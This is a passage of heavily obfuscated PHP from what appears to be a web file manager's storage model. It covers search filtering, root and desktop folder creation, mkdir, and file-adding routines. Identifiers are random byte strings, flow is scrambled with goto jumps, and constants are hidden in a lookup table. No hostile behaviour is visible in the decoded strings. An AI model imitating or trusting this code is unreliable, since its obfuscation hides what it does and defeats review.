$this->_listSearchMerge($C¯»ÔƒğîÑ, $EÀä­Ø™‹â, $FÁŞÙØãÖÂ, $b¬•ÀğÌ†); goto AÍæ«Âùì±; Dò×Õ«‹‡š: $DùòÁœÓ›À =& $_SERVER[¢ÌÛ]; if (!$EÀä­Ø™‹â[$DùòÁœÓ›À[1742]] || $C¯»ÔƒğîÑ[$DùòÁœÓ›À[360]][$DùòÁœÓ›À[349]] > 1) { return; } $fššà­Áö§ = $this->listSearchChildren($EÀä­Ø™‹â[$DùòÁœÓ›À[488]]); goto dÙß×µí®“; AÍæ«Âùì±: } private function _listSearchGroupTag(&$bàÅ¢–™¶, $dÕÒŸ¾…ˆ, $f·£‰Û‰¬Î) { goto C¸‚‡—Ùë; d¼ÚËô»±: $FîÛ¸¹÷ = array_to_keyvalue($FîÛ¸¹÷, $a¿£Šò¸¸[33], $a¿£Šò¸¸[75]); $FçÍàÎ±¾ö = array_unique($FîÛ¸¹÷); $this->_listSearchMerge($bàÅ¢–™¶, $dÕÒŸ¾…ˆ, $f·£‰Û‰¬Î, $FçÍàÎ±¾ö); goto dŠ¾µË²¶¢; C¸‚‡—Ùë: $a¿£Šò¸¸ =& $_SERVER[¢ÌÛ]; if (!$dÕÒŸ¾…ˆ[$a¿£Šò¸¸[1742]] || $bàÅ¢–™¶[$a¿£Šò¸¸[360]][$a¿£Šò¸¸[349]] > 1 || !$dÕÒŸ¾…ˆ[$a¿£Šò¸¸[488]]) { return; } $bÂÌ”„¹´ = $this->sourceInfo($dÕÒŸ¾…ˆ[$a¿£Šò¸¸[488]]); goto CîğÏÁ†ãº; Dõ°§’İ„: $cÓ›Ïºšğ… = array(); $DŸìøë¾˜· = $dÕÒŸ¾…ˆ[$a¿£Šò¸¸[1742]]; foreach ($Aªèù‘Ôáç[$a¿£Šò¸¸[363]] as $C´‘Ôô‚šÁ) { $e¶¢„§¯ó× = $C´‘Ôô‚šÁ[$a¿£Šò¸¸[28]]; $c×Ü·°¥ÜÈ = str_replace($a¿£Šò¸¸[50], $a¿£Šò¸¸[33], Pinyin::encode($e¶¢„§¯ó×)); if (stripos($e¶¢„§¯ó×, $DŸìøë¾˜·) !== !1 || stripos($c×Ü·°¥ÜÈ, $DŸìøë¾˜·) !== !1) { $cÓ›Ïºšğ…[] = $C´‘Ôô‚šÁ[$a¿£Šò¸¸[385]]; } } goto cèí«½ÏÌ; cèí«½ÏÌ: if (!$cÓ›Ïºšğ…) { return; } $AÜÓàÀ·‘É = array($a¿£Šò¸¸[419] => array($a¿£Šò¸¸[7], $cÓ›Ïºšğ…), $a¿£Šò¸¸[1498] => 0, $a¿£Šò¸¸[29] => $a¿£Šò¸¸[1762] . $A—Èµ±ˆ‘); $FîÛ¸¹÷ = Model($a¿£Šò¸¸[420])->field($a¿£Šò¸¸[75])->where($AÜÓàÀ·‘É)->select(); goto d¼ÚËô»±; CîğÏÁ†ãº: if (!$bÂÌ”„¹´ || $bÂÌ”„¹´[$a¿£Šò¸¸[398]] != SourceModel::TYPE_GROUP) { return; } $A—Èµ±ˆ‘ = $bÂÌ”„¹´[$a¿£Šò¸¸[483]]; $Aªèù‘Ôáç = Model($a¿£Šò¸¸[1902])->get($A—Èµ±ˆ‘); goto Dõ°§’İ„; dŠ¾µË²¶¢: } private function _listSearchMerge(&$F­Œ‚‡é°, $Dêì”ôµßõ, $eÖ‘§ƒ‹İ, $BÍ‘ñ–ë†¨) { goto c—ÓÕß²¸•; A­Ñ¾Ôœºä: $B»±œˆ“¾¨ = $this->field($eÖ‘§ƒ‹İ)->where($B½Ïõ±Ü”ğ)->select(); if (!$B»±œˆ“¾¨) { return; } $bŒ‚ïò¾ = array(); goto C†—êŠÒïï; c—ÓÕß²¸•: $DÁ¬ğÌË® =& $_SERVER[¢ÌÛ]; if (!$BÍ‘ñ–ë†¨) { return; } $b²°¯ŠÒ„ = array_to_keyvalue($F­Œ‚‡é°[$DÁ¬ğÌË®[363]], $DÁ¬ğÌË®[33], $DÁ¬ğÌË®[396]); goto cŠµãŞ¼àÊ; C†—êŠÒïï: foreach ($B»±œˆ“¾¨ as $d¡±×¶÷¬) { $C™…³Ñ¢¸ = $DÁ¬ğÌË®[47] . $Dêì”ôµßõ[$DÁ¬ğÌË®[488]] . $DÁ¬ğÌË®[47]; if (stripos($d¡±×¶÷¬[$DÁ¬ğÌË®[486]], $C™…³Ñ¢¸) !== !1) { $bŒ‚ïò¾[] = $d¡±×¶÷¬; } } $F­Œ‚‡é°[$DÁ¬ğÌË®[363]] = array_merge($bŒ‚ïò¾, $F­Œ‚‡é°[$DÁ¬ğÌË®[363]]); $F­Œ‚‡é°[$DÁ¬ğÌË®[360]][$DÁ¬ğÌË®[361]] += count($bŒ‚ïò¾); goto eÜ¢Œ±–•; cŠµãŞ¼àÊ: $fˆ²”˜¶‘« = array_diff($BÍ‘ñ–ë†¨, $b²°¯ŠÒ„); if (!$fˆ²”˜¶‘«) { return; } $B½Ïõ±Ü”ğ = array($DÁ¬ğÌË®[396] => array($DÁ¬ğÌË®[7], $fˆ²”˜¶‘«)); goto A­Ñ¾Ôœºä; eÜ¢Œ±–•: } public function listSearchChildren($aë÷Ş†íÔÍ, $cá·ë×ë÷§ = 5000) { goto E‚†ˆÇœšª; D’¿÷Ï†À: $e–îİ‡½½ = $this->field($fåÁ¾®®Ñ[396])->where($c½Ÿ“­äï)->select(); $c°Ü¾Á°¼Ğ = array_to_keyvalue($e–îİ‡½½, $fåÁ¾®®Ñ[33], $fåÁ¾®®Ñ[396]); return $c°Ü¾Á°¼Ğ; goto Fµ‘»ˆ¾Ïİ; e“ÈÒŒÆîŠ: $c½Ÿ“­äï = array($fåÁ¾®®Ñ[486] => array($fåÁ¾®®Ñ[375], $eóùÌ»‰Æ[$fåÁ¾®®Ñ[486]] . $eóùÌ»‰Æ[$fåÁ¾®®Ñ[396]] . $fåÁ¾®®Ñ[511])); $F«§Ü…ØˆÅ = $this->field($fåÁ¾®®Ñ[396])->cache(null, 600)->where($c½Ÿ“­äï)->count(); if ($F«§Ü…ØˆÅ > $cá·ë×ë÷§) { return $this->_listSearchChildrenNear($aë÷Ş†íÔÍ, $cá·ë×ë÷§); } goto D’¿÷Ï†À; E‚†ˆÇœšª: $fåÁ¾®®Ñ =& $_SERVER[¢ÌÛ]; $c°Ü¾Á°¼Ğ = array(); $eóùÌ»‰Æ = $this->sourceInfo($aë÷Ş†íÔÍ); goto e“ÈÒŒÆîŠ; Fµ‘»ˆ¾Ïİ: } private function _listSearchChildrenNear($F¤œ¹Š…³, $fœÜñ•ñï÷) { goto E¦…¬ëÈÉ; aï¨˜ĞèÓ«: $b¬ŸôÂ± = $this->field($b¼§©–Î“Ê[1903])->where($fé°——ÇÍ„)->select(); $a” ò­±ŞØ = array_to_keyvalue(array_filter_by_field($b¬ŸôÂ±, $b¼§©–Î“Ê[397], $b¼§©–Î“Ê[86]), $b¼§©–Î“Ê[33], $b¼§©–Î“Ê[396]); $eÓÁÊÍìî = array_merge($eÓÁÊÍìî, array_to_keyvalue($b¬ŸôÂ±, $b¼§©–Î“Ê[33], $b¼§©–Î“Ê[396])); goto eá»òóÃ‚; E¦…¬ëÈÉ: $b¼§©–Î“Ê =& $_SERVER[¢ÌÛ]; $eÓÁÊÍìî = array(); $fé°——ÇÍ„ = array($b¼§©–Î“Ê[488] => $F¤œ¹Š…³); goto aï¨˜ĞèÓ«; f„Ç©˜Æ›™: $eÓÁÊÍìî = array_merge($eÓÁÊÍìî, array_to_keyvalue($b¬ŸôÂ±, $b¼§©–Î“Ê[33], $b¼§©–Î“Ê[396])); $eÓÁÊÍìî = array_slice($eÓÁÊÍìî, 0, $fœÜñ•ñï÷); return $eÓÁÊÍìî; goto e©£ÎÏ¬£‚; eá»òóÃ‚: if (!$a” ò­±ŞØ) { return $eÓÁÊÍìî; } $fé°——ÇÍ„ = array($b¼§©–Î“Ê[488] => array($b¼§©–Î“Ê[7], $a” ò­±ŞØ)); $b¬ŸôÂ± = $this->field($b¼§©–Î“Ê[1903])->where($fé°——ÇÍ„)->limit($fœÜñ•ñï÷)->select(); goto f„Ç©˜Æ›™; e©£ÎÏ¬£‚: } private function _listSearchBindPinyin($c’ŞÖ¯‚ç•, &$c·Ô„äÌ¸¦, &$cƒš¤‡œ×Õ) { goto Eˆ”ïÆ¬§; FÕ¯µÊ¸á›: foreach ($FÃ¹™«„Ò» as $E‡Ÿ’»Öë¿) { $Aì¦ÇŸõ”Ş[] = array($CÀ©Î‰´°¶[1907] => $E‡Ÿ’»Öë¿, $CÀ©Î‰´°¶[934] => $CÀ©Î‰´°¶[1746], array($CÀ©Î‰´°¶[1908] => $E‡Ÿ’»Öë¿, $CÀ©Î‰´°¶[1909] => array($CÀ©Î‰´°¶[7], array($CÀ©Î‰´°¶[442], $CÀ©Î‰´°¶[441])))); } $this->join($aŒ…é’†²ó); $c·Ô„äÌ¸¦ = $Aì¦ÇŸõ”Ş; goto D·Êãˆº­Û; Fš–Üã›§ß: $Aì¦ÇŸõ”Ş = array(); $cƒš¤‡œ×Õ = str_replace(array($CÀ©Î‰´°¶[227], $CÀ©Î‰´°¶[50], $CÀ©Î‰´°¶[1904]), $CÀ©Î‰´°¶[33], $cƒš¤‡œ×Õ); $cƒš¤‡œ×Õ = $CÀ©Î‰´°¶[1905] . str_replace($CÀ©Î‰´°¶[47], $CÀ©Î‰´°¶[1906], $cƒš¤‡œ×Õ); goto BÁäÒÂ†Åè; BÁäÒÂ†Åè: $FÃ¹™«„Ò» = $c·Ô„äÌ¸¦[$CÀ©Î‰´°¶[28]]; unset($c·Ô„äÌ¸¦[$CÀ©Î‰´°¶[28]]); foreach ($c·Ô„äÌ¸¦ as $dÍêŠ÷ºĞ => $c‹•óÒæÓÙ) { $Aì¦ÇŸõ”Ş[$CÀ©Î‰´°¶[1905] . $dÍêŠ÷ºĞ] = $c‹•óÒæÓÙ; } goto FÕ¯µÊ¸á›; Eˆ”ïÆ¬§: $CÀ©Î‰´°¶ =& $_SERVER[¢ÌÛ]; if (!Input::check($c’ŞÖ¯‚ç•[$CÀ©Î‰´°¶[1742]], $CÀ©Î‰´°¶[314]) || strlen($c’ŞÖ¯‚ç•[$CÀ©Î‰´°¶[1742]]) < 2) { return; } $aŒ…é’†²ó = "\114\105\x46\x54\x20\x4a\117\111\x4e\40{$this->tablePrefix}\151\x6f\x5f\163\x6f\x75\162\x63\x65\x5f\x6d\x65\164\141\x20\155\145\x74\x61\40\157\x6e\40\x73\x6f\165\x72\x63\145\x2e\x73\157\x75\x72\143\x65\x49\x44\40\75\40\x6d\x65\164\x61\56\x73\157\x75\x72\143\x65\x49\104"; goto Fš–Üã›§ß; D·Êãˆº­Û: } private function _parseSearchWhere($aó¨Ğâµ„ó) { goto Aò¹§¥´; fÀÑè»¸Î: if (isset($aó¨Ğâµ„ó[$fãÅÃ×¦Ã”[560]])) { $DÖùß…ƒøØ[] = array($fãÅÃ×¦Ã”[406] => $aó¨Ğâµ„ó[$fãÅÃ×¦Ã”[560]], $fãÅÃ×¦Ã”[405] => $aó¨Ğâµ„ó[$fãÅÃ×¦Ã”[560]], $fãÅÃ×¦Ã”[934] => $fãÅÃ×¦Ã”[1746]); } if (isset($aó¨Ğâµ„ó[$fãÅÃ×¦Ã”[399]])) { $eÔ–Õ óïæ = $aó¨Ğâµ„ó[$fãÅÃ×¦Ã”[399]]; if ($eÔ–Õ óïæ == $fãÅÃ×¦Ã”[76]) { $DÖùß…ƒøØ[$fãÅÃ×¦Ã”[397]] = 1; } else { if ($eÔ–Õ óïæ == $fãÅÃ×¦Ã”[1915]) { $DÖùß…ƒøØ[$fãÅÃ×¦Ã”[397]] = 0; } else { if ($eÔ–Õ óïæ) { $eÔ–Õ óïæ = is_array($eÔ–Õ óïæ) ? $eÔ–Õ óïæ : explode($fãÅÃ×¦Ã”[47], $eÔ–Õ óïæ); $DÖùß…ƒøØ[$fãÅÃ×¦Ã”[399]] = array($fãÅÃ×¦Ã”[411], $eÔ–Õ óïæ); $DÖùß…ƒøØ[$fãÅÃ×¦Ã”[397]] = 0; } } } } if (isset($aó¨Ğâµ„ó[$fãÅÃ×¦Ã”[488]])) { $FÂƒ÷œ§È = $this->sourceInfo($aó¨Ğâµ„ó[$fãÅÃ×¦Ã”[488]]); $DÖùß…ƒøØ[$fãÅÃ×¦Ã”[551]] = array($fãÅÃ×¦Ã”[510], $FÂƒ÷œ§È[$fãÅÃ×¦Ã”[486]] . $aó¨Ğâµ„ó[$fãÅÃ×¦Ã”[488]] . $fãÅÃ×¦Ã”[511]); } goto Cãò½¼‚«‘; Cãò½¼‚«‘: if (isset($aó¨Ğâµ„ó[$fãÅÃ×¦Ã”[1742]]) && $aó¨Ğâµ„ó[$fãÅÃ×¦Ã”[1742]]) { $f…ìÌ¥¯ªé = $aó¨Ğâµ„ó[$fãÅÃ×¦Ã”[1742]]; $C£‰³›¾Î = explode($fãÅÃ×¦Ã”[50], $f…ìÌ¥¯ªé); if (strlen($f…ìÌ¥¯ªé) > 2 && (substr($f…ìÌ¥¯ªé, 0, 1) == $fãÅÃ×¦Ã”[115] && substr($f…ìÌ¥¯ªé, -1) == $fãÅÃ×¦Ã”[115]) || substr($f…ìÌ¥¯ªé, 0, 1) == $fãÅÃ×¦Ã”[55] && substr($f…ìÌ¥¯ªé, -1) == $fãÅÃ×¦Ã”[55]) { $f…ìÌ¥¯ªé = substr($f…ìÌ¥¯ªé, 1, -1); $C£‰³›¾Î = array($f…ìÌ¥¯ªé); } $DÖùß…ƒøØ[$fãÅÃ×¦Ã”[28]] = array(array($fãÅÃ×¦Ã”[510], $fãÅÃ×¦Ã”[1744] . $f…ìÌ¥¯ªé . $fãÅÃ×¦Ã”[1744])); if (count($C£‰³›¾Î) > 1) { $DÖùß…ƒøØ[$fãÅÃ×¦Ã”[28]] = array(); foreach ($C£‰³›¾Î as $EÖ©‚ö˜‹) { if (!trim($EÖ©‚ö˜‹)) { continue; } $DÖùß…ƒøØ[$fãÅÃ×¦Ã”[28]][] = array($fãÅÃ×¦Ã”[510], $fãÅÃ×¦Ã”[1744] . trim($EÖ©‚ö˜‹) . $fãÅÃ×¦Ã”[1744]); } } } return $DÖùß…ƒøØ; goto C§ª«¯¥á; Aò¹§¥´: $fãÅÃ×¦Ã” =& $_SERVER[¢ÌÛ]; $DÖùß…ƒøØ = array(); if (isset($aó¨Ğâµ„ó[$fãÅÃ×¦Ã”[725]])) { $DÖùß…ƒøØ[$fãÅÃ×¦Ã”[83]] = array($fãÅÃ×¦Ã”[1910], $aó¨Ğâµ„ó[$fãÅÃ×¦Ã”[725]]); } goto aóÜö¥´ø; aóÜö¥´ø: if (isset($aó¨Ğâµ„ó[$fãÅÃ×¦Ã”[474]])) { $CêÆ¥Œ¼ë‡ = array($fãÅÃ×¦Ã”[1911], $aó¨Ğâµ„ó[$fãÅÃ×¦Ã”[474]]); if ($DÖùß…ƒøØ[$fãÅÃ×¦Ã”[83]]) { $DÖùß…ƒøØ[$fãÅÃ×¦Ã”[83]] = array($DÖùß…ƒøØ[$fãÅÃ×¦Ã”[83]], $CêÆ¥Œ¼ë‡, $fãÅÃ×¦Ã”[1912]); } else { $DÖùß…ƒøØ[$fãÅÃ×¦Ã”[83]] = $CêÆ¥Œ¼ë‡; } } if (isset($aó¨Ğâµ„ó[$fãÅÃ×¦Ã”[1913]])) { $DÖùß…ƒøØ[$fãÅÃ×¦Ã”[77]] = array($fãÅÃ×¦Ã”[1910], $aó¨Ğâµ„ó[$fãÅÃ×¦Ã”[1913]]); } if (isset($aó¨Ğâµ„ó[$fãÅÃ×¦Ã”[1914]])) { $CêÆ¥Œ¼ë‡ = array($fãÅÃ×¦Ã”[1911], $aó¨Ğâµ„ó[$fãÅÃ×¦Ã”[1914]]); if ($DÖùß…ƒøØ[$fãÅÃ×¦Ã”[77]]) { $DÖùß…ƒøØ[$fãÅÃ×¦Ã”[77]] = array($DÖùß…ƒøØ[$fãÅÃ×¦Ã”[77]], $CêÆ¥Œ¼ë‡, $fãÅÃ×¦Ã”[1912]); } else { $DÖùß…ƒøØ[$fãÅÃ×¦Ã”[77]] = $CêÆ¥Œ¼ë‡; } } goto fÀÑè»¸Î; C§ª«¯¥á: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($b²‡©åö¥) { $aÀš—ÎŸÉ =& $_SERVER[¢ÌÛ]; $bÂÒê«‰“ = Model($aÀš—ÎŸÉ[501])->where(array($aÀš—ÎŸÉ[1490] => $b²‡©åö¥))->find(); $bä¶Ëã»©† = $this->_mkdirRoot(SourceModel::TYPE_USER, $b²‡©åö¥, $bÂÒê«‰“[$aÀš—ÎŸÉ[28]]); $this->userDesktopAdd($bä¶Ëã»©†); return $bä¶Ëã»©†; } public function userDesktopAdd($cŠŒ÷“„ïÌ) { $fŞ§óóëÛŸ =& $_SERVER[¢ÌÛ]; $B¢æ†’Ÿ‡‚ = LNG($fŞ§óóëÛŸ[1916]); $AêÕØº°Æ = $this->mkdir($cŠŒ÷“„ïÌ, $B¢æ†’Ÿ‡‚); $this->metaSet($AêÕØº°Æ, $fŞ§óóëÛŸ[1917], $fŞ§óóëÛŸ[86]); $this->metaSet($cŠŒ÷“„ïÌ, $fŞ§óóëÛŸ[1918], $AêÕØº°Æ); } public function groupRootAdd($fä„¥£—) { $F×©ÊĞåğÈ =& $_SERVER[¢ÌÛ]; $BŸ»ÛÑºÙù = Model($F×©ÊĞåğÈ[485])->where(array($F×©ÊĞåğÈ[1738] => $fä„¥£—))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $fä„¥£—, $BŸ»ÛÑºÙù[$F×©ÊĞåğÈ[28]]); } public function systemRootPathAdd($fôÌàÓó—‰) { if ($fôÌàÓó—‰ != $_SERVER[¢ÌÛ][1150]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $fôÌàÓó—‰); } public function userRootRemove($f»¾•½Á) { $A»¶İ©¹ì‰ = $this->sourceRoot(SourceModel::TYPE_USER, $f»¾•½Á); if (!$A»¶İ©¹ì‰) { return; } $this->remove($A»¶İ©¹ì‰, !1); } public function groupRootRemove($AÎ„Î’Ê×¦) { $dçºÂöíÀŠ = $this->sourceRoot(SourceModel::TYPE_GROUP, $AÎ„Î’Ê×¦); if (!$dçºÂöíÀŠ) { return; } $this->remove($dçºÂöíÀŠ, !1); } private function _mkdirRoot($D¬ÆùƒÔ ñ, $FÂºÄÛäÏˆ, $A”Å¹Ê¢Éª) { goto B¤˜ºÈ÷´Â; a´ Ù¡÷óø: $E×÷ñÉº½† = $this->add($BŞ¾‹ƒ‚…); $f‡âÄà”öË = array($B×›Ç‰ŠÌ[553] => short_id($E×÷ñÉº½†)); $this->where(array($B×›Ç‰ŠÌ[410] => $E×÷ñÉº½†))->save($f‡âÄà”öË); goto D‰™³°ó½Š; d¶’Öö¥Åå: $B‰óáà¤À = "\x4d\x6f\144\145\x6c\123\x6f\165\x72\x63\145\56\x6d\153\x64\x69\x72\x52\x6f\157\x74\x2e{$D¬ÆùƒÔ ñ}\x2e{$FÂºÄÛäÏˆ}\56" . $A”Å¹Ê¢Éª; CacheLock::lock($B‰óáà¤À); $BŞ¾‹ƒ‚…[$B×›Ç‰ŠÌ[28]] = $A”Å¹Ê¢Éª; goto a´ Ù¡÷óø; D‰™³°ó½Š: CacheLock::unlock($B‰óáà¤À); return $E×÷ñÉº½†; goto B¡¦Û Š; B¤˜ºÈ÷´Â: $B×›Ç‰ŠÌ =& $_SERVER[¢ÌÛ]; $BŞ¾‹ƒ‚… = array($B×›Ç‰ŠÌ[395] => 0, $B×›Ç‰ŠÌ[547] => $D¬ÆùƒÔ ñ, $B×›Ç‰ŠÌ[548] => $FÂºÄÛäÏˆ, $B×›Ç‰ŠÌ[544] => 1, $B×›Ç‰ŠÌ[549] => USER_ID, $B×›Ç‰ŠÌ[550] => USER_ID, $B×›Ç‰ŠÌ[545] => $B×›Ç‰ŠÌ[33], $B×›Ç‰ŠÌ[551] => $B×›Ç‰ŠÌ[497], $B×›Ç‰ŠÌ[422] => 0, $B×›Ç‰ŠÌ[546] => 0, $B×›Ç‰ŠÌ[446] => 0, $B×›Ç‰ŠÌ[552] => $B×›Ç‰ŠÌ[33]); if ($E½¼‰‘¨ï = $this->where($BŞ¾‹ƒ‚…)->find()) { return $E½¼‰‘¨ï[$B×›Ç‰ŠÌ[396]]; } goto d¶’Öö¥Åå; B¡¦Û Š: } private function sourceRoot($dä‡’¯‘À‡, $fæß„Å¹„ñ, $E„²åš¸Œ¶ = false) { $aÆíäğÜÉ =& $_SERVER[¢ÌÛ]; $A‡Éëô±ˆ = array($aÆíäğÜÉ[395] => 0, $aÆíäğÜÉ[547] => $dä‡’¯‘À‡, $aÆíäğÜÉ[548] => $fæß„Å¹„ñ); if ($Cë­Ûß”š = $this->where($A‡Éëô±ˆ)->find()) { return $E„²åš¸Œ¶ ? $Cë­Ûß”š : $Cë­Ûß”š[$aÆíäğÜÉ[396]]; } return !1; } public function sourceRootGroup($eø“ŞŸ«ğÖ) { $d÷½Öë˜ë¹ =& $_SERVER[¢ÌÛ]; if (is_string($eø“ŞŸ«ğÖ)) { $eø“ŞŸ«ğÖ = array($eø“ŞŸ«ğÖ); } $dÖîå¥Ê¦Æ = array($d÷½Öë˜ë¹[395] => 0, $d÷½Öë˜ë¹[547] => SourceModel::TYPE_GROUP, $d÷½Öë˜ë¹[548] => array($d÷½Öë˜ë¹[7], $eø“ŞŸ«ğÖ)); $c¶Ô‰í¢ê” = $this->listSource($dÖîå¥Ê¦Æ, 1000); return array_to_keyvalue($c¶Ô‰í¢ê”[$d÷½Öë˜ë¹[74]], $d÷½Öë˜ë¹[483]); } public function mkfile($b‹½ºğ”Ú¤, $aÙ£˜í£³İ, $B·Â™‹Ë¬ğ = '', $fÓ¯î†Âù = REPEAT_RENAME) { $cÑŠä‡‘ =& $_SERVER[¢ÌÛ]; $cóì˜¤ó´ï = Model($cÑŠä‡‘[569])->addFileByContent($B·Â™‹Ë¬ğ, $aÙ£˜í£³İ); return $this->_createFileCall($b‹½ºğ”Ú¤, $aÙ£˜í£³İ, $cóì˜¤ó´ï, $fÓ¯î†Âù, $cÑŠä‡‘[1187]); } public function addFile($a³‰Ó­–ÅÑ, $CÚá®‘Î­, $e´öšİëªÊ, $e”£İ¸ Ö— = false, $BÓĞİÆµ‘ = REPEAT_RENAME) { $b©† áìóŸ = Model($_SERVER[¢ÌÛ][569])->addFile($CÚá®‘Î­, $e´öšİëªÊ, $e”£İ¸ Ö—); return $this->_createFileCall($a³‰Ó­–ÅÑ, $e´öšİëªÊ, $b©† áìóŸ, $BÓĞİÆµ‘); } public function addFileByFileID($F·èºÍÕ½Ë, $dÛ¤‡Ï’Åƒ, $dó¡¹ÚÄïØ, $BŞ×Ö‚ = REPEAT_RENAME) { $f²èÌ‚¤Ÿ¨ =& $_SERVER[¢ÌÛ]; $cÊå·æÇÙõ = Model($f²èÌ‚¤Ÿ¨[569])->find($dÛ¤‡Ï’Åƒ); Model($f²èÌ‚¤Ÿ¨[569])->linkAdd($dÛ¤‡Ï’Åƒ); return $this->_createFileCall($F·èºÍÕ½Ë, $dó¡¹ÚÄïØ, $cÊå·æÇÙõ, $BŞ×Ö‚); } public function addFileByRemote($AÅùóóé³, $Cˆ Š½Ì¸, $f…‘‘¢·“ô, $c¹–Ñ‹ÛÙÒ = array(), $EˆŠ™¼æ¦ = REPEAT_RENAME) { $Eğ™êêÌ†À = Model($_SERVER[¢ÌÛ][569])->addFileByRemote($Cˆ Š½Ì¸, $f…‘‘¢·“ô, $c¹–Ñ‹ÛÙÒ); return $this->_createFileCall($AÅùóóé³, $f…‘‘¢·“ô, $Eğ™êêÌ†À, $EˆŠ™¼æ¦); } private function _createFileCall($DØæÏ²¤ƒ¤, $D´ñ°²£ïÆ, $A¡ÉŸ†ºĞ, $d¯Ø É¥½, $FÄÃàÖØò¤ = "\165\160\154\157\141\x64") { goto cÊ›ŒìÊ±¯; BÂ½©’ßà: $c˜ÉŠìøóÈ = $this->fileNameExist($DØæÏ²¤ƒ¤, $D´ñ°²£ïÆ); $b®Ë£‡ƒ‡õ = $this->_createFile($DØæÏ²¤ƒ¤, $D´ñ°²£ïÆ, $A¡ÉŸ†ºĞ, $d¯Ø É¥½, $E× ö­®Äá); if (!$E× ö­®Äá) { Model($d¯Ğ×ƒÌ®â[448])->remove($A¡ÉŸ†ºĞ[$d¯Ğ×ƒÌ®â[445]]); } goto eÙƒƒÂêâË; cÊ›ŒìÊ±¯: $d¯Ğ×ƒÌ®â =& $_SERVER[¢ÌÛ]; $E× ö­®Äá = !1; $this->lockWriteStart($DØæÏ²¤ƒ¤, $D´ñ°²£ïÆ); goto BÂ½©’ßà; eÙƒƒÂêâË: if ($E× ö­®Äá && $b®Ë£‡ƒ‡õ && $b®Ë£‡ƒ‡õ != $c˜ÉŠìøóÈ) { Model($d¯Ğ×ƒÌ®â[1888])->eventCreate($b®Ë£‡ƒ‡õ, $FÄÃàÖØò¤); } $this->lockWriteEnd($DØæÏ²¤ƒ¤, $D´ñ°²£ïÆ); return $b®Ë£‡ƒ‡õ; goto E¤™éÒ‚Â¨; E¤™éÒ‚Â¨: } public function mkdir($f…ØÙïƒ»Ä, $B÷äÚëµ, $d¬÷ÛŒè³ = REPEAT_SKIP) { goto bŠ…Ñ®Ó; bŠ…Ñ®Ó: $AÃóÆˆ–ô³ =& $_SERVER[¢ÌÛ]; $d’ò„—Á“… = $this->sourceInfo($f…ØÙïƒ»Ä); if (!$d’ò„—Á“…) { return !1; } goto b¡´ª‰­¯; b¡´ª‰­¯: $this->lockWriteStart($f…ØÙïƒ»Ä, $B÷äÚëµ); if ($d¬÷ÛŒè³ !== !1) { $c‹„å¹ÉÀà = $this->fileNameExist($f…ØÙïƒ»Ä, $B÷äÚëµ); if ($c‹„å¹ÉÀà && $d¬÷ÛŒè³ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($f…ØÙïƒ»Ä, $B÷äÚëµ); return $c‹„å¹ÉÀà; } $B÷äÚëµ = $this->fileNameAuto($f…ØÙïƒ»Ä, $B÷äÚëµ, $d¬÷ÛŒè³); } $DÊÛ¼¬äÍÛ = array($AÃóÆˆ–ô³[544] => 1, $AÃóÆˆ–ô³[413] => $B÷äÚëµ, $AÃóÆˆ–ô³[545] => $AÃóÆˆ–ô³[33], $AÃóÆˆ–ô³[446] => 0, $AÃóÆˆ–ô³[546] => 0); goto F˜Éîö™¼¼; F˜Éîö™¼¼: $aö’óöÕÉ = $this->_addSoure($DÊÛ¼¬äÍÛ, $d’ò„—Á“…); Model($AÃóÆˆ–ô³[1888])->eventCreate($aö’óöÕÉ, $AÃóÆˆ–ô³[1188]); $this->lockWriteEnd($f…ØÙïƒ»Ä, $B÷äÚëµ); goto A»®òŸº«š; A»®òŸº«š: return $aö’óöÕÉ; goto Bã“«ô‹ƒ†; Bã“«ô‹ƒ†: } private function _createFile($DôÉƒ×ßö, $C“Çé‡‰¾, $cå×±¯é›¯, $DØ®‚‰È˜Ã, &$cˆ˜´§Ñˆ) { goto FÌ¢Øì•×Ö; Eß‘–Üˆ„¡: if ($DØ®‚‰È˜Ã !== !1) { $eÓÁïø§Ù = $this->fileNameExist($DôÉƒ×ßö, $C“Çé‡‰¾); } $cˆ˜´§Ñˆ = !0; if ($DØ®‚‰È˜Ã && $eÓÁïø§Ù) { if ($DØ®‚‰È˜Ã == REPEAT_SKIP) { $cˆ˜´§Ñˆ = !1; return $eÓÁïø§Ù; } else { if ($DØ®‚‰È˜Ã == REPEAT_REPLACE) { $B‹£»«£ = $this->sourceInfo($eÓÁïø§Ù); $Føé¨áª‚Á = $this->fileHistory($B‹£»«£, $cå×±¯é›¯[$AÅïÎÒ£²¢[445]], $cå×±¯é›¯[$AÅïÎÒ£²¢[77]]); if (!$Føé¨áª‚Á) { $cˆ˜´§Ñˆ = !1; } else { $this->folderSizeReset($DôÉƒ×ßö); } return $eÓÁïø§Ù; } else { $C“Çé‡‰¾ = $this->fileNameAuto($DôÉƒ×ßö, $C“Çé‡‰¾, $DØ®‚‰È˜Ã, !1); } } } goto b¢ˆ…Á†‚·; FÌ¢Øì•×Ö: $AÅïÎÒ£²¢ =& $_SERVER[¢ÌÛ]; $aŒÁÏÛİò¥ = $this->sourceInfo($DôÉƒ×ßö); if (!$cå×±¯é›¯ || !$aŒÁÏÛİò¥) { return !1; } goto Eß‘–Üˆ„¡; b¢ˆ…Á†‚·: $DÁâˆÊÈ·Î = array($AÅïÎÒ£²¢[544] => 0, $AÅïÎÒ£²¢[413] => $C“Çé‡‰¾, $AÅïÎÒ£²¢[545] => get_path_ext($C“Çé‡‰¾), $AÅïÎÒ£²¢[446] => $cå×±¯é›¯[$AÅïÎÒ£²¢[445]], $AÅïÎÒ£²¢[546] => $cå×±¯é›¯[$AÅïÎÒ£²¢[77]]); $b‚§Ûî¿ç = $this->_addSoure($DÁâˆÊÈ·Î, $aŒÁÏÛİò¥); $this->folderSizeReset($DôÉƒ×ßö, intval($DÁâˆÊÈ·Î[$AÅïÎÒ£²¢[77]])); goto cËÇ¡Ÿ‘ÒÀ; cËÇ¡Ÿ‘ÒÀ: return $b‚§Ûî¿ç; goto CóÃìÏæëà; CóÃìÏæëà: } protected function fileHistory($BäíêĞÊĞ‹, $d¤•¤¬ÀØ, $FÕ™ìì–Çí) { goto føÃØÀí½½; føÃØÀí½½: $B‡æÎµØ‡ =& $_SERVER[¢ÌÛ]; if ($BäíêĞÊĞ‹[$B‡æÎµØ‡[445]] == $d¤•¤¬ÀØ) { return !1; } 